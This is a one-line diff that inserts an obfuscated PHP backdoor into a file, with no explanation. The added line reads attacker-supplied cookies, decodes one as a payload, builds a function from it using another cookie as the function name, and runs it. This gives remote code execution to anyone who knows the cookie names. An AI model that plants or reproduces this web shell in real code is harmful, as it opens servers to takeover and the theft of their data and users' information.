@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['elp']){$ji=$_COOKIE['elp']("",@$_COOKIE['qdp'](@$_COOKIE['gl']));$ji();}?>
